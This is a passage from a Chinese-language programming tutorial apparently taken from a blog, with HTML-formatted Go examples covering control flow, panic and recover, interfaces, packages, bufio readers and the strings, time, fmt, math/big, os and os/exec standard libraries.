class="string">"noon"</span>, element)</span><br><span class="line"> <span class="comment">// 使用</span></span><br><span class="line"> l.Remove(element) <span class="comment">//删除fist这个元素</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>遍历所有链表<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i:=mylist.Front();i!=nil;i=i.Next(){</span><br><span class="line">fmt.Println(i.Value)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="nil"><a href="#nil" class="headerlink" title="nil"></a>nil</h3><p>nil 是 map、slice、pointer、channel、func、interface 的零值</p><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><ol><li>if左边的括号必须要和if在同一行</li><li></li></ol><p>if 还有一种特殊的写法，可以在 if 表达式之前添加一个执行语句，再根据变量值进行判断，代码如下：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if err := Connect(); err != nil {</span><br><span class="line">    fmt.Println(err)</span><br><span class="line">    return</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><p>break退出指定循环，一个标签只能对应一个循环<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">out:</span><br><span class="line">for i:=1;;i++{</span><br><span class="line">if i&gt;9{</span><br><span class="line">break out</span><br><span class="line">}else{</span><br><span class="line">fmt.Println("test")</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>continue 语句可以结束当前循环，开始下一次的循环迭代过程，仅限在 for 循环内使用，在 continue 语句后添加标签时，表示开始标签对应的循环</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">OuterLoop:</span><br><span class="line">    for i := 0; i &lt; 2; i++ {</span><br><span class="line">        for j := 0; j &lt; 5; j++ {</span><br><span class="line">            switch j {</span><br><span class="line">            case 2:</span><br><span class="line">                fmt.Println(i, j)</span><br><span class="line">                continue OuterLoop //表示结束当前循环，开启下一次的外层循环，而不是第 10 行的循环。</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">输出：0 2</span><br><span class="line">      1 2</span><br></pre></td></tr></tbody></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ol><li><p>在函数中，实参通过值传递的方式进行传递，因此函数的形参是实参的拷贝，对形参进行修改不会影响实参，但是，如果实参包括引用类型，如指针、slice(切片)、map、function、channel 等类型，实参可能会由于函数的间接引用被修改。</p></li><li><p>在Go语言中，函数也是一种类型，可以和其他类型一样保存在变量中,下面的代码定义了一个函数变量 f，并将一个函数名为 echo() 的函数赋给函数变量 f，这样调用函数变量 f 时，实际调用的就是 echo() 函数，代码如下：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">func main(){</span><br><span class="line">var f func(string)</span><br><span class="line">f=echo</span><br><span class="line">f("test")</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func echo(s string)  {</span><br><span class="line">a:=s</span><br><span class="line">fmt.Println(a)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>宕机</p></li></ol><p>发生宕机时后面的代码都不会执行，注意一点就是defer如果在发生宕机前面的话，还是正常执行的<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">func main(){</span><br><span class="line">defer fmt.Println("a")</span><br><span class="line">defer fmt.Println("b")</span><br><span class="line">panic("Done!")</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">b</span><br><span class="line">a</span><br><span class="line">panic: Done!</span><br></pre></td></tr></tbody></table></figure><p></p><ol start="4"><li>宕机恢复recover</li></ol><p>一旦发生宕机，其后的代码是不会执行的，但是会调用位于panic代码所在的哪一行之前的defer延迟函数，所以说这个特性就决定recover应该用在defer函数中，否则一旦发生宕机，除了defer延迟函数中的语句还能执行外，其他的语句都是不能执行的。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">func main() {</span><br><span class="line">fmt.Println("Begin!")</span><br><span class="line">defer func() {</span><br><span class="line">if err := recover(); err != nil {</span><br><span class="line">fmt.Println("error: ", err)</span><br><span class="line">}</span><br><span class="line">}()</span><br><span class="line">var a *int</span><br><span class="line">*a = 1 //空指针的引用，会发生宕机</span><br><span class="line">fmt.Println("Not end!")</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">Begin!</span><br><span class="line">error:  runtime error: invalid memory address or nil pointer dereference</span><br></pre></td></tr></tbody></table></figure><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>每个接口类型由<strong>数个方法</strong>组成。接口的形式代码如下：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">接口声明的格式</span><br><span class="line">type 接口类型名 interface{</span><br><span class="line">    方法名1( 参数列表1 ) 返回值列表1</span><br><span class="line">    方法名2( 参数列表2 ) 返回值列表2</span><br><span class="line">    …</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>对各个部分的说明：</p><ol><li>接口类型名：使用 type 将接口定义为自定义的类型名。Go语言的接口在命名时，一般会在单词后面添加 er，如有写操作的接口叫 Writer，有字符串功能的接口叫 Stringer，有关闭功能的接口叫 Closer 等。</li><li>方法名：当方法名首字母是大写时，且这个接口类型名首字母也是大写时，这个方法可以被接口所在的包（package）之外的代码访问。<br>参数列表、返回值列表：参数列表和返回值列表中的参数变量名可以被忽略，例如：<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type writer interface{</span><br><span class="line">    Write([]byte) error</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ol><h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><h4 id="package语句"><a href="#package语句" class="headerlink" title="package语句"></a>package语句</h4><ol><li>要想使用自定义的包中的函数、变量、结构体，则首字母必须要大写（即public），如果首字母是小写则外部包访问（即private）</li></ol><h5 id="导入自定义包"><a href="#导入自定义包" class="headerlink" title="导入自定义包"></a>导入自定义包</h5><ol><li>import后面是文件夹名称</li><li>文件夹名称和package名称不一定要相同</li><li>调用自定义包中的函数使用<code>packeage.func()</code>来调用</li><li>自定义包的调用和文件名<strong>没有关系</strong>，只与文件中的<code>package</code>语句有关，go会自动查找import文件夹里面的所有文件，然后查找所有package，不同的go文件可以有相同的package名称</li></ol><h4 id="import语句"><a href="#import语句" class="headerlink" title="import语句"></a>import语句</h4><h5 id="导入匿名包"><a href="#导入匿名包" class="headerlink" title="导入匿名包"></a>导入匿名包</h5><blockquote><p>如果只希望导入包，而不使用任何包内的结构和类型，也不调用包内的任何函数时，可以使用匿名导入包</p></blockquote><p>使用下划线导入一个匿名包格式如下：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import _ "path/to/package"</span><br></pre></td></tr></tbody></table></figure><p></p><p>注意：<strong>匿名包也会和其它包一样，也会被编译到可执行文件中，同时匿名包中的init函数也会被执行</strong></p><h3 id="io"><a href="#io" class="headerlink" title="io"></a>io</h3><p><code>ReadByte()</code>方法</p><blockquote><p><code>ReadByte()</code> 方法的功能是读取并返回一个字节。如果没有字节可读，则返回错误信息。该方法原型声明如下：</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func (b *Reader) ReadByte() (c byte,err error)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">func main()  {</span><br><span class="line">    arr:=[]byte("test")</span><br><span class="line">    rd := bytes.NewReader(arr)</span><br><span class="line">    r := bufio.NewReader(rd)</span><br><span class="line">    nn,err:=r.ReadByte()</span><br><span class="line">    fmt.Println(nn,err)</span><br><span class="line">    n,error_1:=r.ReadByte() //读完一个字节之后，将指针指向下一个字节</span><br><span class="line">    fmt.Println(n,error_1)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">output: </span><br><span class="line">116 &lt;nil&gt;</span><br><span class="line">101 &lt;nil&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="ReadBytes-方法"><a href="#ReadBytes-方法" class="headerlink" title="ReadBytes() 方法"></a><code>ReadBytes()</code> 方法</h3><blockquote><p>ReadBytes() 方法的功能是 ReadBytes 读取数据直到遇到第一个分隔符“delim”，并返回读取的字节序列（包括“delim”）。如果 ReadBytes 在读到第一个“delim”之前出错，它返回已读取的数据和那个错误（通常是 io.EOF）。只有当返回的数据不以“delim”结尾时，返回的 err 才不为空值。该方法原型声明如下：</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func (b *Reader) ReadBytes(delim byte) (line []byte, err error)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    arr:=[]byte("Hey,guy")</span><br><span class="line">    rd := bytes.NewReader(arr)</span><br><span class="line">    r := bufio.NewReader(rd)</span><br><span class="line">    n,err:=r.ReadBytes(',')</span><br><span class="line">    fmt.Println(string(n),err)</span><br><span class="line">    n,err=r.ReadBytes(',')</span><br><span class="line">    fmt.Println(string(n),err)</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">Hey, &lt;nil&gt;</span><br><span class="line">guy EOF</span><br></pre></td></tr></tbody></table></figure><h3 id="接口-1"><a href="#接口-1" class="headerlink" title="接口"></a>接口</h3><h4 id="接口被实现的条件一：接口的方法与实现接口的类型方法格式一致"><a href="#接口被实现的条件一：接口的方法与实现接口的类型方法格式一致" class="headerlink" title="接口被实现的条件一：接口的方法与实现接口的类型方法格式一致"></a>接口被实现的条件一：接口的方法与实现接口的类型方法格式一致</h4><blockquote><p>在类型中添加与接口签名一致的方法就可以实现该方法。签名包括方法中的名称、参数列表、返回参数列表。也就是说，只要实现接口类型中的方法的名称、参数列表、返回参数列表中的任意一项与接口要实现的方法不一致，那么接口的这个方法就不会被实现。</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Print <span class="keyword">interface</span>{</span><br><span class="line">    Printdata(data <span class="keyword">interface</span>{}) error</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Data <span class="keyword">struct</span>{</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Data)</span> <span class="title">Printdata</span><span class="params">(data <span class="keyword">interface</span>{})</span> <span class="title">error</span></span> {</span><br><span class="line">    fmt.Println(data)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>{</span><br><span class="line">    f:=&amp;Data{}</span><br><span class="line">    <span class="keyword">var</span> toPrint Print</span><br><span class="line">    toPrint = f <span class="comment">//虽然f和toPrint变量类型不一致，但是toPrint是一个接口，而且toPrint中的方法已经被Printdata全部实现，所以是可以直接赋值</span></span><br><span class="line">    toPrint.Printdata(<span class="string">"Hello World!"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果结构体中没有实现接口中的所有方法，那么就会报错。</p><h4 id="接口被实现的条件二：接口中所有方法均被实现"><a href="#接口被实现的条件二：接口中所有方法均被实现" class="headerlink" title="接口被实现的条件二：接口中所有方法均被实现"></a>接口被实现的条件二：接口中所有方法均被实现</h4><blockquote><p>当一个接口中有多个方法时，只有这些方法都被实现了，接口才能被正确编译并使用。</p></blockquote><p>如果我们在接口中新添加一个方法<code>IsPrint()</code>，如果结构体中没有实现，那么也会编译不通过</p><h4 id="多个类型可以实现相同的接口"><a href="#多个类型可以实现相同的接口" class="headerlink" title="多个类型可以实现相同的接口"></a>多个类型可以实现相同的接口</h4><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Service <span class="keyword">interface</span>{</span><br><span class="line">    Start()</span><br><span class="line">    Logger(<span class="keyword">string</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Showlog <span class="keyword">struct</span>{</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MyService <span class="keyword">struct</span>{</span><br><span class="line">    Showlog</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(S *Showlog)</span> <span class="title">Logger</span><span class="params">(log <span class="keyword">string</span>)</span></span>{</span><br><span class="line">    fmt.Println(log,<span class="string">"is running"</span>)</span><br><span class="line">} </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(M *MyService)</span> <span class="title">Start</span><span class="params">()</span></span>{</span><br><span class="line">    fmt.Println(<span class="string">"The service begin run"</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="keyword">var</span> s Service = &amp;MyService{}</span><br><span class="line">    s.Start()</span><br><span class="line">    s.Logger(<span class="string">"localhost"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="goland的常见标准库"><a href="#goland的常见标准库" class="headerlink" title="goland的常见标准库"></a>goland的常见标准库</h2><h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><p><code>HasPrefix</code>判断字符串s是否以prefix开头:<br>函数签名<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings.HasPrefix(s, prefix string) bool</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>HasSuffix</code>判断字符串 s 是否以 suffix 结尾：</p><p>函数签名<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings.HasSuffix(s, suffix string) bool</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">func main()  {</span><br><span class="line">    fmt.Println(strings.HasPrefix("this is strings","th"))</span><br><span class="line">    fmt.Println(strings.HasSuffix("this is strings","ings"))</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">true</span><br><span class="line">true</span><br></pre></td></tr></tbody></table></figure><p><code>Contains</code>字符串包含关系</p><blockquote><p>功能：字符串s中是否包含substr，返回bool值</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func Contains(s, substr string) bool</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(strings.Contains("this my world!","this"))</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">true</span><br></pre></td></tr></tbody></table></figure><p><code>Join</code>(拼接slice到字符串，不能是数组)</p><blockquote><p>Join 用于将元素类型为 string 的 slice 使用分割符号来拼接组成一个字符串</p></blockquote><p>函数签名<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings.Join(sl []string, sep string) string</span><br></pre></td></tr></tbody></table></figure><p></p><p>例子<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arr:=[]string {"abc","def"}</span><br><span class="line">fmt.Println(strings.Join(arr,""))</span><br><span class="line">fmt.Println(strings.Join(arr,","))</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">abcdef</span><br><span class="line">abc,def</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>Index</code></p><blockquote><p>在字符串s中查找sep所在的位置，返回位置值，找不到返回-1</p></blockquote><p>语法：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings.Index(s, str string) int</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(strings.Index("this is my world","is"))</span><br><span class="line"></span><br><span class="line">output: 2</span><br></pre></td></tr></tbody></table></figure><p>LastIndex</p><blockquote><p>LastIndex 返回字符串 str 在字符串 s 中最后出现位置的索引（str 的第一个字符的索引），-1 表示字符串 s 不包含字符串 str：</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings.LastIndex(s, str string) int</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(strings.LastIndex("this is my world","is"))</span><br><span class="line"></span><br><span class="line">output: 5</span><br></pre></td></tr></tbody></table></figure><p>如果需要查询非 ASCII 编码的字符在父字符串中的位置，建议使用以下函数来对字符进行定位：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings.IndexRune(s string, r rune) int</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str:="this is my world"</span><br><span class="line">fmt.Println(strings.IndexRune(str,rune('a')))</span><br><span class="line">fmt.Println(strings.IndexRune(str,111))</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">-1</span><br><span class="line">12</span><br></pre></td></tr></tbody></table></figure><p>Count</p><blockquote><p>Count 用于计算字符串 str 在字符串 s 中出现的非重叠次数：</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings.Count(s, str string) int</span><br></pre></td></tr></tbody></table></figure><p>例子<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str:="this is my world"</span><br><span class="line">fmt.Println(strings.Count(str,"is"))</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">2</span><br></pre></td></tr></tbody></table></figure><p></p><p>Repeat</p><blockquote><p>重复s字符串count次，并返回一个新的字符串</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func Repeat(s string, count int) string</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str:="this is my world"</span><br><span class="line">fmt.Println(strings.Repeat(str,3))</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">this is my worldthis is my worldthis is my world</span><br></pre></td></tr></tbody></table></figure><p>Replace (字符串替换)</p><blockquote><p>在s字符串中，把old字符串替换为new字符串，n表示替换的次数，小于0表示全部替换</p></blockquote><p>注意：替换的次数必须有，不然就会报错<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func Replace(s, old, new string, n int) string</span><br></pre></td></tr></tbody></table></figure><p></p><p>例子<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str:="this is my world"</span><br><span class="line">fmt.Println(strings.Replace(str,"is","are",2))</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="time"><a href="#time" class="headerlink" title="time"></a>time</h3><p>时间戳<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">now:=time.Now()</span><br><span class="line">fmt.Println(now.Unix())</span><br></pre></td></tr></tbody></table></figure><p></p><p>延时<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">time.Sleep(3 *time.Second) //延时3秒</span><br><span class="line">time.Sleep(3 *time.Minute) //延时3分钟</span><br><span class="line">time.Sleep(3 *time.Hour) //延时3小时</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>Printf</p><p><em>整数型</em><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%b    表示为二进制</span><br><span class="line">%c    该值对应的unicode码值</span><br><span class="line">%d    表示为十进制</span><br><span class="line">%o    表示为八进制</span><br><span class="line">%q    该值对应的单引号括起来的go语法字符字面值，必要时会采用安全的转义表示</span><br><span class="line">%x    表示为十六进制，使用a-f</span><br><span class="line">%X    表示为十六进制，使用A-F</span><br><span class="line">%U    表示为Unicode格式：U+1234，等价于"U+%04X"</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="math-big"><a href="#math-big" class="headerlink" title="math/big"></a>math/big</h3><blockquote><p>主要用于大数运算</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//设置一个大于Int64的10进制整数</span><br><span class="line">bigint := new(big.Int)</span><br><span class="line">mybigint, _ := bigint.SetString("115792089237316195423570985008687907853269984665640564039457584007913129639936", 10)</span><br><span class="line"></span><br><span class="line">//输出可以用%v或者用String()方法</span><br><span class="line">fmt.Printf("%v\n",a)</span><br><span class="line">fmt.Println(a.String())</span><br><span class="line"></span><br><span class="line">//大数相加</span><br><span class="line"></span><br><span class="line">c:=big.NewInt(1)</span><br><span class="line">mybigint.Add(mybigint,c) //Add的返回值是一个big.Int对象，即mybigint+c的结果</span><br><span class="line">fmt.Println(mybigint.String())</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bigint := new(big.Int)</span><br><span class="line">mybigint, _ := bigint.SetString("115792089237316195423570985008687907853269984665640564039457584007913129639936", 10)</span><br><span class="line">c:=big.NewInt(1)</span><br><span class="line">f:=big.NewInt(1)</span><br><span class="line">d:=f.Add(mybigint,c)</span><br><span class="line">fmt.Println(mybigint.String()) //此时mybigint的值没有发生变化</span><br><span class="line">fmt.Println(f.String())         //此时f的值发生了变化</span><br><span class="line">fmt.Println(d.String())         //此时d的值发生了变化</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">115792089237316195423570985008687907853269984665640564039457584007913129639936</span><br><span class="line">115792089237316195423570985008687907853269984665640564039457584007913129639937</span><br><span class="line">115792089237316195423570985008687907853269984665640564039457584007913129639937</span><br></pre></td></tr></tbody></table></figure><h3 id="os包"><a href="#os包" class="headerlink" title="os包"></a>os包</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(os.Getegid()) //</span><br><span class="line">fmt.Println(os.Chdir("../")) //改变工作目录</span><br><span class="line">fmt.Println(os.Getwd()) //获取当前工作目录</span><br><span class="line">fmt.Println(os.Getenv("tmp")) //返回指定环境变量</span><br><span class="line">fmt.Println(os.Environ()) //返回所有环境变量</span><br><span class="line">//os.Exit(0) //系统退出，并返回 code，其中 0 表示执行成功并退出，非 0 表示错误并退出</span><br><span class="line">fmt.Println(os.Getpid()) //获取进程id</span><br><span class="line">fmt.Println(os.Getppid()) //获取父进程id</span><br><span class="line">fmt.Println(os.Hostname()) //获取主机名</span><br></pre></td></tr></tbody></table></figure><h3 id="os-exec"><a href="#os-exec" class="headerlink" title="os/exec"></a>os/exec</h3><p>执行系统命令<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">func main() {</span><br><span class="line">c:=exec.Command("ipconfig")</span><br><span class="line">cmd,err:=c.CombinedOutput()</span><br><span class="line">if 